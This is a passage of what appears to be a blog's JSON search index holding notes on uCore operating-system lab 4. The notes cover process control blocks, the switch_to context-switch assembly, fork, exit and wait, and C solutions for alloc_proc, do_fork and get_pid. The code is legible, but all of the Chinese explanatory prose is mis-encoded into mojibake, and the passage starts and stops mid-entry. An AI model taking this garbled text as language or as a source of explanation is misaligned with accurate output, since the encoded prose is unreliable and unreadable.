¸ä¸­ä¹Ÿæ˜¯ç›¸å¯¹ç‹¬ç«‹çš„ï¼ˆä¾‹å¦‚ç‹¬ç«‹çš„å†…æ ¸å †æ ˆä»¥åŠä¸Šä¸‹æ–‡ç­‰ç­‰ï¼‰ã€‚ä½¿ç”¨ context ä¿å­˜å¯„å­˜å™¨çš„ç›®çš„å°±åœ¨äºåœ¨å†…æ ¸æ€ä¸­èƒ½å¤Ÿè¿›è¡Œä¸Šä¸‹æ–‡ä¹‹é—´çš„åˆ‡æ¢ã€‚å®é™…åˆ©ç”¨contextè¿›è¡Œä¸Šä¸‹æ–‡åˆ‡æ¢çš„å‡½æ•°æ˜¯åœ¨kern/process/switch.Sä¸­å®šä¹‰switch_toã€‚ tfï¼šä¸­æ–­å¸§çš„æŒ‡é’ˆï¼Œæ€»æ˜¯æŒ‡å‘å†…æ ¸æ ˆçš„æŸä¸ªä½ç½®ï¼šå½“è¿›ç¨‹ä»ç”¨æˆ·ç©ºé—´è·³åˆ°å†…æ ¸ç©ºé—´æ—¶ï¼Œä¸­æ–­å¸§è®°å½•äº†è¿›ç¨‹åœ¨è¢«ä¸­æ–­å‰çš„çŠ¶æ€ã€‚å½“å†…æ ¸éœ€è¦è·³å›ç”¨æˆ·ç©ºé—´æ—¶ï¼Œéœ€è¦è°ƒæ•´ä¸­æ–­å¸§ä»¥æ¢å¤è®©è¿›ç¨‹ç»§ç»­æ‰§è¡Œçš„å„å¯„å­˜å™¨å€¼ã€‚é™¤æ­¤ä¹‹å¤–ï¼ŒuCoreå†…æ ¸å…è®¸åµŒå¥—ä¸­æ–­ã€‚å› æ­¤ä¸ºäº†ä¿è¯åµŒå¥—ä¸­æ–­å‘ç”Ÿæ—¶tf æ€»æ˜¯èƒ½å¤ŸæŒ‡å‘å½“å‰çš„trapframeï¼ŒuCore åœ¨å†…æ ¸æ ˆä¸Šç»´æŠ¤äº† tf çš„é“¾ï¼Œå¯ä»¥å‚è€ƒtrap.c::trapå‡½æ•°åšè¿›ä¸€æ­¥çš„äº†è§£ã€‚ cr3: cr3 ä¿å­˜é¡µè¡¨çš„ç‰©ç†åœ°å€ï¼Œç›®çš„å°±æ˜¯è¿›ç¨‹åˆ‡æ¢çš„æ—¶å€™æ–¹ä¾¿ç›´æ¥ä½¿ç”¨ lcr3å®ç°é¡µè¡¨åˆ‡æ¢ï¼Œé¿å…æ¯æ¬¡éƒ½æ ¹æ® mm æ¥è®¡ç®— cr3ã€‚mmæ•°æ®ç»“æ„æ˜¯ç”¨æ¥å®ç°ç”¨æˆ·ç©ºé—´çš„è™šå­˜ç®¡ç†çš„ï¼Œä½†æ˜¯å†…æ ¸çº¿ç¨‹æ²¡æœ‰ç”¨æˆ·ç©ºé—´ï¼Œå®ƒæ‰§è¡Œçš„åªæ˜¯å†…æ ¸ä¸­çš„ä¸€å°æ®µä»£ç ï¼ˆé€šå¸¸æ˜¯ä¸€å°æ®µå‡½æ•°ï¼‰ï¼Œæ‰€ä»¥å®ƒæ²¡æœ‰mm ç»“æ„ï¼Œä¹Ÿå°±æ˜¯NULLã€‚å½“æŸä¸ªè¿›ç¨‹æ˜¯ä¸€ä¸ªæ™®é€šç”¨æˆ·æ€è¿›ç¨‹çš„æ—¶å€™ï¼ŒPCB ä¸­çš„ cr3 å°±æ˜¯ mm ä¸­é¡µè¡¨ï¼ˆpgdirï¼‰çš„ç‰©ç†åœ°å€ï¼›è€Œå½“å®ƒæ˜¯å†…æ ¸çº¿ç¨‹çš„æ—¶å€™ï¼Œcr3 ç­‰äºboot_cr3ã€‚è€Œboot_cr3æŒ‡å‘äº†uCoreå¯åŠ¨æ—¶å»ºç«‹å¥½çš„é¥¿å†…æ ¸è™šæ‹Ÿç©ºé—´çš„é¡µç›®å½•è¡¨é¦–åœ°å€ã€‚ kstack: æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰ä¸€ä¸ªå†…æ ¸æ ˆï¼Œå¹¶ä¸”ä½äºå†…æ ¸åœ°å€ç©ºé—´çš„ä¸åŒä½ç½®ã€‚å¯¹äºå†…æ ¸çº¿ç¨‹ï¼Œè¯¥æ ˆå°±æ˜¯è¿è¡Œæ—¶çš„ç¨‹åºä½¿ç”¨çš„æ ˆï¼›è€Œå¯¹äºæ™®é€šè¿›ç¨‹ï¼Œè¯¥æ ˆæ˜¯å‘ç”Ÿç‰¹æƒçº§æ”¹å˜çš„æ—¶å€™ä½¿ä¿å­˜è¢«æ‰“æ–­çš„ç¡¬ä»¶ä¿¡æ¯ç”¨çš„æ ˆã€‚uCoreåœ¨åˆ›å»ºè¿›ç¨‹æ—¶åˆ†é…äº† 2 ä¸ªè¿ç»­çš„ç‰©ç†é¡µï¼ˆå‚è§memlayout.hä¸­KSTACKSIZEçš„å®šä¹‰ï¼‰ä½œä¸ºå†…æ ¸æ ˆçš„ç©ºé—´ã€‚è¿™ä¸ªæ ˆå¾ˆå°ï¼Œæ‰€ä»¥å†…æ ¸ä¸­çš„ä»£ç åº”è¯¥å°½å¯èƒ½çš„ç´§å‡‘ï¼Œå¹¶ä¸”é¿å…åœ¨æ ˆä¸Šåˆ†é…å¤§çš„æ•°æ®ç»“æ„ï¼Œä»¥å…æ ˆæº¢å‡ºï¼Œå¯¼è‡´ç³»ç»Ÿå´©æºƒã€‚kstackè®°å½•äº†åˆ†é…ç»™è¯¥è¿›ç¨‹/çº¿ç¨‹çš„å†…æ ¸æ ˆçš„ä½ç½®ã€‚ä¸»è¦ä½œç”¨æœ‰ä»¥ä¸‹å‡ ç‚¹ã€‚é¦–å…ˆï¼Œå½“å†…æ ¸å‡†å¤‡ä»ä¸€ä¸ªè¿›ç¨‹åˆ‡æ¢åˆ°å¦ä¸€ä¸ªçš„æ—¶å€™ï¼Œéœ€è¦æ ¹æ®kstack çš„å€¼æ­£ç¡®çš„è®¾ç½®å¥½ tss ï¼ˆå¯ä»¥å›é¡¾ä¸€ä¸‹åœ¨å®éªŒä¸€ä¸­è®²è¿°çš„ tss åœ¨ä¸­æ–­å¤„ç†è¿‡ç¨‹ä¸­çš„ä½œç”¨ï¼‰ï¼Œä»¥ä¾¿åœ¨è¿›ç¨‹åˆ‡æ¢ä»¥åå†å‘ç”Ÿä¸­æ–­æ—¶èƒ½å¤Ÿä½¿ç”¨æ­£ç¡®çš„æ ˆã€‚å…¶æ¬¡ï¼Œå†…æ ¸æ ˆä½äºå†…æ ¸åœ°å€ç©ºé—´ï¼Œå¹¶ä¸”æ˜¯ä¸å…±äº«çš„ï¼ˆæ¯ä¸ªçº¿ç¨‹éƒ½æ‹¥æœ‰è‡ªå·±çš„å†…æ ¸æ ˆï¼‰ï¼Œå› æ­¤ä¸å—åˆ° mm çš„ç®¡ç†ï¼Œå½“è¿›ç¨‹é€€å‡ºçš„æ—¶å€™ï¼Œå†…æ ¸èƒ½å¤Ÿæ ¹æ® kstack çš„å€¼å¿«é€Ÿå®šä½æ ˆçš„ä½ç½®å¹¶è¿›è¡Œå›æ”¶ã€‚uCore çš„è¿™ç§å†…æ ¸æ ˆçš„è®¾è®¡å€Ÿé‰´çš„æ˜¯ linux çš„æ–¹æ³•ï¼ˆä½†ç”±äºå†…å­˜ç®¡ç†å®ç°çš„å·®å¼‚ï¼Œå®ƒå®ç°çš„è¿œä¸å¦‚ linux çš„çµæ´»ï¼‰ï¼Œå®ƒä½¿å¾—æ¯ä¸ªçº¿ç¨‹çš„å†…æ ¸æ ˆåœ¨ä¸åŒçš„ä½ç½®ï¼Œè¿™æ ·ä»æŸç§ç¨‹åº¦ä¸Šæ–¹ä¾¿è°ƒè¯•ï¼Œä½†åŒæ—¶ä¹Ÿä½¿å¾—å†…æ ¸å¯¹æ ˆæº¢å‡ºå˜å¾—ååˆ†ä¸æ•æ„Ÿï¼Œå› ä¸ºä¸€æ—¦å‘ç”Ÿæº¢å‡ºï¼Œå®ƒæå¯èƒ½æ±¡æŸ“å†…æ ¸ä¸­å…¶å®ƒçš„æ•°æ®ä½¿å¾—å†…æ ¸å´©æºƒã€‚å¦‚æœèƒ½å¤Ÿé€šè¿‡é¡µè¡¨ï¼Œå°†æ‰€æœ‰è¿›ç¨‹çš„å†…æ ¸æ ˆæ˜ å°„åˆ°å›ºå®šçš„åœ°å€ä¸Šå»ï¼Œèƒ½å¤Ÿé¿å…è¿™ç§é—®é¢˜ï¼Œä½†åˆä¼šä½¿å¾—è¿›ç¨‹åˆ‡æ¢è¿‡ç¨‹ä¸­å¯¹æ ˆçš„ä¿®æ”¹å˜å¾—ç›¸å½“ç¹çã€‚æ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥å‚è€ƒ linux kernel çš„ä»£ç å¯¹æ­¤è¿›è¡Œå°è¯•ã€‚ ä¸ºäº†ç®¡ç†ç³»ç»Ÿä¸­æ‰€æœ‰çš„è¿›ç¨‹æ§åˆ¶å—ï¼ŒuCoreç»´æŠ¤äº†å¦‚ä¸‹å…¨å±€å˜é‡ï¼ˆä½äºkern/process/proc.cï¼‰ï¼š static struct proc *currentï¼šå½“å‰å ç”¨CPUä¸”å¤„äºâ€œè¿è¡Œâ€çŠ¶æ€è¿›ç¨‹æ§åˆ¶å—æŒ‡é’ˆã€‚é€šå¸¸è¿™ä¸ªå˜é‡æ˜¯åªè¯»çš„ï¼Œåªæœ‰åœ¨è¿›ç¨‹åˆ‡æ¢çš„æ—¶å€™æ‰è¿›è¡Œä¿®æ”¹ï¼Œå¹¶ä¸”æ•´ä¸ªåˆ‡æ¢å’Œä¿®æ”¹è¿‡ç¨‹éœ€è¦ä¿è¯æ“ä½œçš„åŸå­æ€§ï¼Œç›®å‰è‡³å°‘éœ€è¦å±è”½ä¸­æ–­ã€‚ static struct proc *initprocï¼šæœ¬å®éªŒä¸­ï¼ŒæŒ‡å‘ä¸€ä¸ªå†…æ ¸çº¿ç¨‹ã€‚æœ¬å®éªŒä»¥åï¼Œæ­¤æŒ‡é’ˆå°†æŒ‡å‘ç¬¬ä¸€ä¸ªç”¨æˆ·æ€è¿›ç¨‹ã€‚ static list_entry_t hash_list[HASH_LIST_SIZE]ï¼šæ‰€æœ‰è¿›ç¨‹æ§åˆ¶å—çš„å“ˆå¸Œè¡¨ï¼Œproc_structä¸­çš„æˆå‘˜å˜é‡hash_linkå°†åŸºäºpidé“¾æ¥å…¥è¿™ä¸ªå“ˆå¸Œè¡¨ä¸­ list_entry_t proc_listï¼šæ‰€æœ‰è¿›ç¨‹æ§åˆ¶å—çš„åŒå‘çº¿æ€§åˆ—è¡¨ï¼Œproc_structä¸­çš„æˆå‘˜å˜é‡list_linkå°†é“¾æ¥å…¥è¿™ä¸ªé“¾è¡¨ä¸­ã€‚ ","date":"2021-12-13","objectID":"/ucore-lab-4/:1:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#ucoreçš„pcb"},{"categories":["Pwning"],"content":"åˆ‡æ¢æµç¨‹ å¼€å§‹è°ƒåº¦ï¼šuCoreä¸­ï¼Œå†…æ ¸çš„ç¬¬ä¸€ä¸ªè¿›ç¨‹idleprocä¼šæ‰§è¡Œcpu_idleå‡½æ•°ï¼Œå¹¶ä»ä¸­è°ƒç”¨scheduleå‡½æ•°ï¼Œå‡†å¤‡å¼€å§‹è°ƒåº¦è¿›ç¨‹ã€‚ æ¸…é™¤è°ƒåº¦æ ‡å¿—ï¼šscheduleæ¸…é™¤è°ƒåº¦æ ‡å¿—ï¼Œä¸èƒ½å†æ¬¡ä¿®æ”¹ æŸ¥æ‰¾å°±ç»ªè¿›ç¨‹ï¼šscheduleå¹¶ä»å½“å‰è¿›ç¨‹åœ¨é“¾è¡¨ä¸­çš„ä½ç½®å¼€å§‹ï¼Œéå†è¿›ç¨‹æ§åˆ¶å—ï¼Œç›´åˆ°æ‰¾å‡ºå¤„äºå°±ç»ªçŠ¶æ€çš„è¿›ç¨‹ã€‚å¯èƒ½æ‰¾åˆ°çš„è¿˜æ˜¯å½“å‰è¿›ç¨‹ã€‚ ä¿®æ”¹è¿›ç¨‹çŠ¶æ€ï¼šscheduleå½“å‰è¿›ç¨‹è¿›å…¥å°±ç»ªæ€æˆ–ç­‰å¾…çŠ¶æ€ï¼Œæ–°çš„è¿›ç¨‹æ”¹ä¸ºè¿è¡Œ è¿›ç¨‹åˆ‡æ¢ï¼šswitch_to swtich_to switch_toè¿›è¡Œè¿›ç¨‹çš„åˆ‡æ¢ï¼Œä¸ºäº†ä¿è¯åˆ‡æ¢é€Ÿåº¦ï¼Œè¿™éƒ¨åˆ†çš„ä»£ç ä½¿ç”¨æ±‡ç¼–å®ç°ã€‚åœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸Šéœ€è¦ä¿å­˜çš„å¯„å­˜å™¨ç­‰ä¿¡æ¯ä¸åŒï¼Œæ‰€ä»¥å®ç°ä¹Ÿä¸åŒã€‚å¤§è‡´ä¸ºå‰åŠæ®µä¿å­˜è¿›ç¨‹ä¿¡æ¯ï¼Œåˆ‡æ¢åï¼Œä»æ–°è¿›ç¨‹çš„PCBæ¢å¤è¿›ç¨‹ä¸Šä¸‹æ–‡ã€‚ .text .globl switch_to switch_to: # switch_to(from, to) # save from's registers movl 4(%esp), %eax # eax points to from popl 0(%eax) # save eip !popl movl %esp, 4(%eax) # save esp::context of from movl %ebx, 8(%eax) # save ebx::context of from movl %ecx, 12(%eax) # save ecx::context of from movl %edx, 16(%eax) # save edx::context of from movl %esi, 20(%eax) # save esi::context of from movl %edi, 24(%eax) # save edi::context of from movl %ebp, 28(%eax) # save ebp::context of from # restore to's registers movl 4(%esp), %eax # not 8(%esp): popped return address already # eax now points to to movl 28(%eax), %ebp # restore ebp::context of to movl 24(%eax), %edi # restore edi::context of to movl 20(%eax), %esi # restore esi::context of to movl 16(%eax), %edx # restore edx::context of to movl 12(%eax), %ecx # restore ecx::context of to movl 8(%eax), %ebx # restore ebx::context of to movl 4(%eax), %esp # restore esp::context of to pushl 0(%eax) # push eip ret ","date":"2021-12-13","objectID":"/ucore-lab-4/:2:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#åˆ‡æ¢æµç¨‹"},{"categories":["Pwning"],"content":"è¿›ç¨‹åˆ›å»ºWindows APIï¼šCreateProcess() Unix APIï¼šforkå’Œexec å…¶ä¸­ï¼ŒforkæŠŠä¸€ä¸ªè¿›ç¨‹å¤åˆ¶æˆä¸¤ä¸ªé™¤PIDä»¥å¤–å®Œå…¨ç›¸åŒçš„è¿›ç¨‹ã€‚ execç”¨æ–°è¿›ç¨‹æ¥é‡å†™å½“å‰è¿›ç¨‹ï¼ŒPIDæ²¡æœ‰æ”¹å˜ã€‚ forkåˆ›å»ºä¸€ä¸ªç»§æ‰¿çš„å­è¿›ç¨‹ã€‚è¯¥å­è¿›ç¨‹å¤åˆ¶çˆ¶è¿›ç¨‹çš„æ‰€æœ‰å˜é‡å’Œå†…å­˜ï¼Œä»¥åŠçˆ¶è¿›ç¨‹çš„æ‰€æœ‰CPUå¯„å­˜å™¨ï¼ˆé™¤äº†æŸä¸ªç‰¹æ®Šå¯„å­˜å™¨ï¼Œä»¥åŒºåˆ†æ˜¯å­è¿›ç¨‹è¿˜æ˜¯çˆ¶è¿›ç¨‹ï¼‰ã€‚ forkå‡½æ•°ä¸€æ¬¡è°ƒç”¨ï¼Œè¿”å›ä¸¤ä¸ªå€¼ã€‚çˆ¶è¿›ç¨‹ä¸­è¿”å›å­è¿›ç¨‹çš„PIDï¼Œå­è¿›ç¨‹ä¸­è¿”å›0ã€‚ forkå‡½æ•°çš„å¼€é”€ååˆ†æ˜‚è´µï¼Œå…¶å®ç°å¼€é”€æ¥æºäº å¯¹å­è¿›ç¨‹åˆ†é…å†…å­˜ã€‚ å¤åˆ¶çˆ¶è¿›ç¨‹çš„å†…å­˜å’Œå¯„å­˜å™¨åˆ°å­è¿›ç¨‹ä¸­ã€‚ è€Œä¸”ï¼Œåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè°ƒç”¨forkå‡½æ•°åå°±ç´§æ¥ç€è°ƒç”¨execï¼Œæ­¤æ—¶forkä¸­çš„å†…å­˜å¤åˆ¶æ“ä½œæ˜¯æ— ç”¨çš„ã€‚å› æ­¤ï¼Œforkå‡½æ•°ä¸­ä½¿ç”¨å†™æ—¶å¤åˆ¶æŠ€æœ¯(Copy on Writeï¼Œ COW)ã€‚ ","date":"2021-12-13","objectID":"/ucore-lab-4/:3:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#è¿›ç¨‹åˆ›å»º-1"},{"categories":["Pwning"],"content":"ç©ºé—²è¿›ç¨‹çš„åˆ›å»ºç©ºé—²è¿›ç¨‹idleä¸»è¦å·¥ä½œæ˜¯å®Œæˆå†…æ ¸ä¸­å„ä¸ªå­ç³»ç»Ÿçš„åˆå§‹åŒ–ï¼Œå¹¶æœ€åç”¨äºè°ƒåº¦å…¶ä»–è¿›ç¨‹ã€‚è¯¥è¿›ç¨‹æœ€ç»ˆä¼šä¸€ç›´åœ¨cpu_idleå‡½æ•°ä¸­åˆ¤æ–­å½“å‰æ˜¯å¦å¯è°ƒåº¦ã€‚ ç”±äºè¯¥è¿›ç¨‹æ˜¯ä¸ºäº†è°ƒåº¦è¿›ç¨‹è€Œåˆ›å»ºçš„ï¼Œæ‰€ä»¥å…¶need_reschedæˆå‘˜åˆå§‹æ—¶ä¸º1ã€‚ ","date":"2021-12-13","objectID":"/ucore-lab-4/:3:1","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#ç©ºé—²è¿›ç¨‹çš„åˆ›å»º"},{"categories":["Pwning"],"content":"ç¬¬ä¸€ä¸ªå†…æ ¸çº¿ç¨‹çš„åˆ›å»ºç¬¬ä¸€ä¸ªå†…æ ¸è¿›ç¨‹æ˜¯æœªæ¥æ‰€æœ‰æ–°è¿›ç¨‹çš„çˆ¶è¿›ç¨‹æˆ–ç¥–å…ˆè¿›ç¨‹ã€‚ initprocï¼šåœ¨proc_init()åˆ›å»º åˆå§‹åŒ–trapframeï¼škernel_thread â€“\u003e do_fork â€“\u003e copy_thread() åˆå§‹åŒ–initprocï¼šåˆå§‹åŒ–å®ƒçš„PCBï¼Œalloc_proc åˆå§‹åŒ–å†…æ ¸å †æ ˆï¼šsetup_stack() å†…å­˜å…±äº«ï¼šcopy_stack()ä¸å…¶ä»–å†…æ ¸çº¿ç¨‹å…±äº«å†…æ ¸åœ°å€ç©ºé—´ æŠŠinitprocæ”¾åˆ°å°±ç»ªé˜Ÿåˆ— å”¤é†’ ","date":"2021-12-13","objectID":"/ucore-lab-4/:3:2","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#ç¬¬ä¸€ä¸ªå†…æ ¸çº¿ç¨‹çš„åˆ›å»º"},{"categories":["Pwning"],"content":"è¿›ç¨‹ç»ˆæ­¢","date":"2021-12-13","objectID":"/ucore-lab-4/:4:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#è¿›ç¨‹ç»ˆæ­¢"},{"categories":["Pwning"],"content":"waitwaitç³»ç»Ÿè°ƒç”¨ç”¨äºçˆ¶è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹çš„ç»“æŸ å­è¿›ç¨‹ç»“æŸæ—¶ï¼Œé€šè¿‡exit()å‘çˆ¶è¿›ç¨‹è¿”å›ä¸€ä¸ªå€¼ çˆ¶è¿›ç¨‹é€šè¿‡waitæ¥æ”¶å¹¶å¤„ç†è¿”å›å€¼ waitå‡½æ•°è°ƒç”¨çš„åŠŸèƒ½ æœ‰å­è¿›ç¨‹å­˜æ´»æ—¶ï¼Œçˆ¶è¿›ç¨‹è¿›å…¥ç­‰å¾…çŠ¶æ€ï¼Œç­‰å¾…å­è¿›ç¨‹è¿”å›ç»“æœ å½“æŸå­è¿›ç¨‹è°ƒç”¨ exit()æ—¶ï¼Œå”¤é†’çˆ¶è¿›ç¨‹ï¼Œå°†exit()çš„è¿”å›å€¼ä½œä¸ºçˆ¶è¿›ç¨‹ä¸­waitçš„è¿”å›å€¼ æœ‰åƒµå°¸å­è¿›ç¨‹ç­‰å¾…æ—¶ï¼Œwait()ç«‹å³è¿”å›å…¶ä¸­ä¸€ä¸ªå€¼ æ— å­è¿›ç¨‹å­˜æ´»æ—¶ï¼Œwait()ç«‹å³è¿”å› ","date":"2021-12-13","objectID":"/ucore-lab-4/:4:1","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#wait"},{"categories":["Pwning"],"content":"exitè¿›ç¨‹ç»“æŸæ—¶è°ƒç”¨exit()ï¼Œå®Œæˆè¿›ç¨‹èµ„æºå›æ”¶ã€‚ exitå‡½æ•°è°ƒç”¨çš„åŠŸèƒ½ å°†è°ƒç”¨å‚æ•°ä½œä¸ºè¿›ç¨‹çš„â€œç»“æœâ€ å…³é—­æ‰€æœ‰æ‰“å¼€çš„æ–‡ä»¶ç­‰å ç”¨èµ„æºã€‚ é‡Šæ”¾å†…å­˜ é‡Šæ”¾å¤§éƒ¨åˆ†è¿›ç¨‹ç›¸å…³çš„å†…æ ¸æ•°æ®ç»“æ„ æ£€æŸ¥çˆ¶è¿›ç¨‹æ˜¯å¦å­˜æ´» å¦‚æœå­˜æ´»ï¼Œåˆ™ä¿ç•™ç»“æœçš„å€¼ï¼Œç›´åˆ°çˆ¶è¿›ç¨‹ä½¿ç”¨ã€‚åŒæ—¶å½“å‰è¿›ç¨‹è¿›å…¥åƒµå°¸(zombie)çŠ¶æ€ã€‚ å¦‚æœæ²¡æœ‰ï¼Œå®ƒå°†é‡Šæ”¾æ‰€æœ‰çš„æ•°æ®ç»“æ„ï¼Œè¿›ç¨‹ç»“æŸã€‚ æ¸…ç†æ‰€æœ‰ç­‰å¾…çš„åƒµå°¸è¿›ç¨‹ã€‚ è¿›ç¨‹ç»ˆæ­¢æ˜¯æœ€ç»ˆçš„åƒåœ¾æ”¶é›†ï¼ˆèµ„æºå›æ”¶ï¼‰ã€‚ ","date":"2021-12-13","objectID":"/ucore-lab-4/:4:2","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#exit"},{"categories":["Pwning"],"content":"uCoreè¿›ç¨‹çš„åˆå§‹åŒ– // proc_init - set up the first kernel thread idleproc \"idle\" by itself and // - create the second kernel thread init_main void proc_init(void) { int i; list_init(\u0026proc_list); for (i = 0; i \u003c HASH_LIST_SIZE; i ++) { list_init(hash_list + i); } if ((idleproc = alloc_proc()) == NULL) { panic(\"cannot alloc idleproc.\\n\"); } idleproc-\u003epid = 0; idleproc-\u003estate = PROC_RUNNABLE; idleproc-\u003ekstack = (uintptr_t)bootstack; idleproc-\u003eneed_resched = 1; set_proc_name(idleproc, \"idle\"); nr_process ++; current = idleproc; int pid = kernel_thread(init_main, \"Hello world!!\", 0); if (pid \u003c= 0) { panic(\"create init_main failed.\\n\"); } initproc = find_proc(pid); set_proc_name(initproc, \"init\"); assert(idleproc != NULL \u0026\u0026 idleproc-\u003epid == 0); assert(initproc != NULL \u0026\u0026 initproc-\u003epid == 1); } é¦–å…ˆåˆå§‹åŒ–äº†è¿›ç¨‹ç›¸å…³çš„é“¾è¡¨ï¼Œç„¶åé€šè¿‡alloc_procæ‰‹åŠ¨æ„é€ äº†è¿›ç¨‹idleå¹¶è®¾ç½®å…¶ä¸­çš„å‚æ•°å€¼ã€‚ æ¥ç€åˆ›å»ºäº†å†…æ ¸çº¿ç¨‹initprocï¼Œä½¿å…¶æ‰§è¡Œinit_mainã€‚ ä¸»è¦å‡½æ•°æ˜¯kernel_thread int kernel_thread(int (*fn)(void *), void *arg, uint32_t clone_flags) { struct trapframe tf; memset(\u0026tf, 0, sizeof(struct trapframe)); tf.tf_cs = KERNEL_CS; tf.tf_ds = tf.tf_es = tf.tf_ss = KERNEL_DS; tf.tf_regs.reg_ebx = (uint32_t)fn; tf.tf_regs.reg_edx = (uint32_t)arg; tf.tf_eip = (uint32_t)kernel_thread_entry; return do_fork(clone_flags | CLONE_VM, 0, \u0026tf); } é¦–å…ˆè®¾ç½®äº†trapframeçš„å¿…è¦å­—æ®µï¼Œä¹‹åä½¿ç”¨do_forkåšçœŸæ­£çš„åˆ›å»ºã€‚ ","date":"2021-12-13","objectID":"/ucore-lab-4/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#ucoreè¿›ç¨‹çš„åˆå§‹åŒ–"},{"categories":["Pwning"],"content":"ç»ƒä¹ 1åˆ†é…å¹¶åˆå§‹åŒ–ä¸€ä¸ªè¿›ç¨‹æ§åˆ¶å— // alloc_proc - alloc a proc_struct and init all fields of proc_struct static struct proc_struct * alloc_proc(void) { struct proc_struct *proc = kmalloc(sizeof(struct proc_struct)); if (proc != NULL) { proc-\u003estate = PROC_UNINIT; proc-\u003epid = -1; proc-\u003ekstack = 0; proc-\u003eneed_resched = 0; proc-\u003eparent = NULL; proc-\u003emm = NULL; memset(\u0026proc-\u003econtext, 0, sizeof(struct context)); proc-\u003etf = NULL; proc-\u003ecr3 = boot_cr3; proc-\u003eflags = 0; memset(proc-\u003ename, 0, sizeof(proc-\u003ename)); } return proc; } è¯·è¯´æ˜proc_structä¸­struct context contextå’Œstruct trapframe *tfæˆå‘˜å˜é‡å«ä¹‰å’Œåœ¨æœ¬å®éªŒä¸­çš„ä½œç”¨æ˜¯å•¥ï¼Ÿ å¯ä»¥æ³¨æ„åˆ°ï¼Œåœ¨è¿›ç¨‹åœ¨æˆ‘ä»¬çš„å†…æ ¸å‡ºç°ä¹‹å‰ï¼Œä»…æœ‰trapframeçš„å­˜åœ¨ã€‚trapframeåœ¨ä¸­æ–­å¤„ç†æ—¶ï¼Œä¿å­˜åˆ°åˆ‡æ¢åçš„æ ˆä¸­ï¼Œç”¨äºåœ¨ä»å†…æ ¸æ€è¿”å›åˆ°ç”¨æˆ·æ€çš„è¿›ç¨‹ä¸Šä¸‹æ–‡ä¿å­˜ã€‚ è€Œåœ¨å†…æ ¸ä¸­æ–­ä¸­æ²¡æœ‰è¿™ç§ç»“æ„ï¼Œåªæœ‰çº¿ç¨‹/è¿›ç¨‹çš„åˆ‡æ¢ã€‚è¿™æ—¶å€™å°±è¦ä½¿ç”¨åˆ°contextç»“æ„äº†ã€‚åœ¨contextç»“æ„ä¸­ï¼Œåªæœ‰å¯„å­˜å™¨çš„ä¿å­˜ï¼Œæ²¡æœ‰æ®µå¯„å­˜å™¨ã€‚å› ä¸ºè¿›ç¨‹ä¹‹é—´åˆ‡æ¢ä¸æ¶‰åŠç‰¹æƒçº§çš„å˜åŒ–ã€‚ ","date":"2021-12-13","objectID":"/ucore-lab-4/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#ç»ƒä¹ 1"},{"categories":["Pwning"],"content":"ç»ƒä¹ 2ä¸ºæ–°åˆ›å»ºçš„å†…æ ¸çº¿ç¨‹åˆ†é…èµ„æº /* do_fork - parent process for a new child process * @clone_flags: used to guide how to clone the child process * @stack: the parent's user stack pointer. if stack==0, It means to fork a kernel thread. * @tf: the trapframe info, which will be copied to child process's proc-\u003etf */ int do_fork(uint32_t clone_flags, uintptr_t stack, struct trapframe *tf) { int ret = -E_NO_FREE_PROC; struct proc_struct *proc; if (nr_process \u003e= MAX_PROCESS) { goto fork_out; } ret = -E_NO_MEM; proc = alloc_proc(); if(proc == NULL) { cprintf(\"alloc_proc faile in do_fork\"); goto bad_fork_cleanup_proc; } if((ret = setup_kstack(proc)) != 0) { cprintf(\"setup_kstack faile in do_fork\"); goto bad_fork_cleanup_proc; } if((ret = copy_mm(clone_flags, proc)) != 0) { cprintf(\"copy_mm faile in do_fork\"); goto bad_fork_cleanup_kstack; } copy_thread(proc, stack, tf); bool intr_flag; local_intr_save(intr_flag); { proc-\u003epid = get_pid(); hash_proc(proc); list_add(proc_list.prev, \u0026proc-\u003elist_link); nr_process++; } local_intr_restore(intr_flag); wakeup_proc(proc); ret = proc-\u003epid; fork_out: return ret; bad_fork_cleanup_kstack: put_kstack(proc); bad_fork_cleanup_proc: kfree(proc); goto fork_out; } åœ¨forkä¸­ï¼Œä¸ºè¿›ç¨‹ç”³è¯·PCBï¼Œè®¾ç½®å †æ ˆï¼Œè¿˜è¦å°†å…¶åŠ å…¥åˆ°ç›¸å…³é“¾è¡¨ä¸­ã€‚æ³¨æ„è¿›ç¨‹ç›¸å…³çš„ä¸€äº›é“¾è¡¨æ˜¯å…¨å±€å˜é‡ï¼è¿™æ„å‘³ç€ï¼Œå¤šä¸ªå†…æ ¸çº¿ç¨‹éƒ½å¯ä»¥è®¿é—®æˆ–ä¿®æ”¹ï¼Œæ‰€ä»¥ä¸ºäº†é¿å…æ¡ä»¶ç«äº‰ï¼Œæˆ‘ä»¬åœ¨è¿›è¡Œå¯¹åº”çš„æ“ä½œæ—¶è¦å±è”½ä¸­æ–­ã€‚ è¯·è¯´æ˜ucoreæ˜¯å¦åšåˆ°ç»™æ¯ä¸ªæ–°forkçš„çº¿ç¨‹ä¸€ä¸ªå”¯ä¸€çš„idï¼Ÿè¯·è¯´æ˜ä½ çš„åˆ†æå’Œç†ç”±ã€‚ // get_pid - alloc a unique pid for process static int get_pid(void) { static_assert(MAX_PID \u003e MAX_PROCESS); struct proc_struct *proc; list_entry_t *list = \u0026proc_list, *le; static int next_safe = MAX_PID, last_pid = MAX_PID; if (++ last_pid \u003e= MAX_PID) { last_pid = 1; goto inside; } if (last_pid \u003e= next_safe) { inside: next_safe = MAX_PID; repeat: le = list; while ((le = list_next(le)) != list) { proc = le2proc(le, list_link); if (proc-\u003epid == last_pid) { if (++ last_pid 